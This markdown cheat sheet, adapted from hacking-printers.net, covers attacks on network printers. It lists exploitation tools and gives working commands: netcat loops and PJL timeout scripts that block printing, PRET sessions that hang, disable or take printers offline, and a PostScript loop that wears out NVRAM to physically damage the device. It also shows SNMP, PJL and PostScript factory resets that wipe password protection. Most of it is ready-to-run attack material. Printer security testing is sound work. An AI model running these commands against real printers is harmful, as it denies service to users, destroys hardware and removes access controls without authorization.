# printer-hacking

> Adapted from http://hacking-printers.net/

## Printer Hacking Tools

- [PRET](https://github.com/RUB-NDS/PRET) - Printer Exploitation Toolkit
- [Praeda](https://github.com/percx/Praeda) - Automated Printer Data Harvesting Tool
- [PFT & Hijetter](http://www.phenoelit.org/hp/) - One of the Early Network Printer Exploitation Tools
- [BeEF](https://github.com/beefproject/beef) - Browser Exploitation Framework that can be used for performing [Cross-site printing](http://hacking-printers.net/wiki/index.php/Cross-site_printing)

## Protocols/Languages
- [PostScript](http://hacking-printers.net/wiki/index.php/PostScript)
- [Printer Job Language (PJL)](http://hacking-printers.net/wiki/index.php/PJL)
- [Simple Network Management Protocol (SNMP)](http://hacking-printers.net/wiki/index.php/SNMP)
- [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol)
- [Printer Management Language (PML)](http://hacking-printers.net/wiki/index.php/PML)
- [Internet Printing Protocol (IPP)](http://hacking-printers.net/wiki/index.php/IPP)
- [Line Printer Daemon (LPD)](http://hacking-printers.net/wiki/index.php/LPD)

## Typical Steps

- perform [generic network assessment](http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html)
- information gathering with Praeda
- use the [cheatsheet](http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet) to find and exploit flaws
- use PRET for fun & profit

## Cheatsheet

### [Denial of Service](http://hacking-printers.net/wiki/index.php/Denial_of_service)

#### [Transmission Channel](http://hacking-printers.net/wiki/index.php/Transmission_channel)

- TCP Protocol
- If print jobs are processed in series – which is assumed for most devices – only one job can be handled at a time.
- Setting high timeout value can effectively be used to enhance attack.
- Simple way with nc: `while true; do nc printer 9100; done`
- Set maximum timeout value as in following shell script:

```shell
# get maximum timeout value with PJL
MAX="`echo "@PJL INFO VARIABLES" | nc -w3 printer 9100 |\
  grep -E -A2 '^TIMEOUT=' | tail -n1 | awk '{print $1}'`"
# connect and set maximum timeout for current job with PJL
while true; do echo "@PJL SET TIMEOUT=$MAX" | nc printer 9100; done
```
- With PRET, a sample session to get timeout values would look like below:

```shell
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> env timeout
TIMEOUT=15 [2 RANGE]
       5
       300
```

#### [Document Processing](http://hacking-printers.net/wiki/index.php/Document_processing)

- sending malicious print job to cause DoS
- abuse of allowing infinite loops or calculations that require a lot of computing time can be abused to keep the printer's RIP busy
- With PS and PJL
- Commands with PRET and PostScript: `disable`, `hang`

```shell
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hang
Warning: This command causes an infinite loop rendering the
device useless until manual restart. Press CTRL+C to abort.
Executing PostScript infinite loop in... 10 9 8 7 6 5 4 3 2 1 KABOOM!

./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> disable
Disabling printing functionality
```

- Commands with PRET and PJL: `disable`, `offline`

```shell
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> disable
Printing functionality: OFF

./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> offline "MESSAGE TO DSIPLAY"
Warning: Taking the printer offline will prevent yourself and others
from printing or re-connecting to the device. Press CTRL+C to abort.
Taking printer offline in... 10 9 8 7 6 5 4 3 2 1 KABOOM!
```

#### [Physical Damage](http://hacking-printers.net/wiki/index.php/Physical_damage)

- Using PS and PJL
- On PRET, both PS and PJL mode support `destroy` command
- exploiting finite number of rewrites on NVRAM
- Example PJL: `@PJL DEFAULT COPIES=X` where X is number of copies
- PostScript example

```
/counter 0 def
{ << /Password counter 16 string cvs
     /SystemParamsPassword counter 1 add 16 string cvs
  >> setsystemparams /counter counter 1 add def
} loop
```

### [Privilege Escalation](http://hacking-printers.net/wiki/index.php/Privilege_escalation)

#### [Factory Defaults](http://hacking-printers.net/wiki/index.php/Factory_defaults)

- resetting device to factory defaults often opens holes as the factory defaults are usually known/public
- can usually be done by pressing a special key combination on the printer's control panel

*Using SNMP*

- The Printer-MIB defines the prtGeneralReset Object (OID 1.3.6.1.2.1.43.5.1.1.3.1) which allows an attacker to restart the device (powerCycleReset(4)), reset the NVRAM settings (resetToNVRAM(5)) or restore factory defaults (resetToFactoryDefaults(6)) using SNMP.
- supported by a large variety of printers and removes all protection mechanisms like user-set passwords for the embedded web server
- all static IP address configuration will be lost and without DHCP service on network, attacker might not be able to reconnect
- use SNMP to test this attack : `snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6`
- Anyone who can send network packets to port 161/udp of the printer device can perform this attack

*Using PML/PJL*

- most likely to only work on HP printers because SNMP can be transformed into its PML representation and embed the request within a legitimate print job on HP printers
- Example PJL : `@PJL DMCMD ASCIIHEX="040006020501010301040106"`
- PRET example

```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```

- Anyone who can print, for example through USB drive or cable, Port 9100 printing or Cross-site printing can perform this attack.

*Using PostScript*

- `FactoryDefaults` system parameter, a flag that, if set to true immediately before the printer is turned off, causes all nonvolatile parameters to revert to their factory default values at the next power-on
- Restarting the printer on the other hand can be accomplished by SNMP and PML
- Restarting with PostScript requires valid password so restart might be easier to get done with SNMP/PML after postscript attack
- Infinite loop attack via postscript might be an alternative for forcing users to reboot their printers
- Set Postscript sys params to factory defaults: `<< /FactoryDefaults true >> setsystemparams` and restart the PostScript interpreter and virtual memory with `true 0 startjob systemdict /quit get exec`
- PRET Example

```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
